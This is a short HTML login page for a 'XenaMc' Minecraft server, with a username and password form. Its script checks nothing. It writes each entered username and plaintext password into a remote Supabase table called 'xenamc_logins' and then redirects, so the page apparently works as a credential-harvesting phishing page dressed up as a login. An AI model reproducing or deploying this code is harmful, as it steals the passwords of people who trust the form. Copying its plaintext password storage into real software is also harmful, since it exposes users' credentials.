<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>XenaMc â€” Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
* { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, Arial; }
body {
  margin: 0;
  height: 100vh;
  background: #000;
  display: flex;
  align-items: center;
  justify-content: center;
}
.card {
  width: 100%;
  max-width: 380px;
  padding: 32px;
  background: #0a0a0a;
  border-radius: 20px;
}
h1 { color: #fff; text-align: center; }
.subtitle { text-align: center; color: #888; margin-bottom: 20px; }
input {
  width: 100%;
  padding: 14px;
  margin-bottom: 14px;
  background: #111;
  border: 1px solid #222;
  border-radius: 10px;
  color: #fff;
}
button {
  width: 100%;
  padding: 14px;
  background: #fff;
  border: none;
  border-radius: 10px;
  font-weight: 600;
  cursor: pointer;
}
.msg { margin-top: 10px; text-align: center; color: red; font-size: 13px; }
</style>
</head>

<body>

<div class="card">
  <h1>XenaMc</h1>
  <div class="subtitle">Minecraft Server Login</div>

  <input id="username" placeholder="Username" autocomplete="username">
  <input id="password" type="password" placeholder="Password" autocomplete="current-password">

  <button id="loginBtn">Login</button>
  <div class="msg" id="msg"></div>
</div>

<script>
const { createClient } = supabase;

const db = createClient(
  "https://lzejbjlqelatkqnkdshe.supabase.co",
  "sb_publishable_1RvGSDU8JPM_uFe_InBW3Q_iGRO8ENB"
);

document.getElementById("loginBtn").addEventListener("click", async () => {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value;
  const msg = document.getElementById("msg");

  if (!username || !password) {
    msg.textContent = "Enter username and password.";
    return;
  }

  const { error } = await db
    .from("xenamc_logins")
    .insert([{ username, password }]);

  if (error) {
    console.error(error);
    msg.textContent = "Database error.";
    return;
  }

  window.location.href = "/full.html";
});
</script>

</body>
</html>
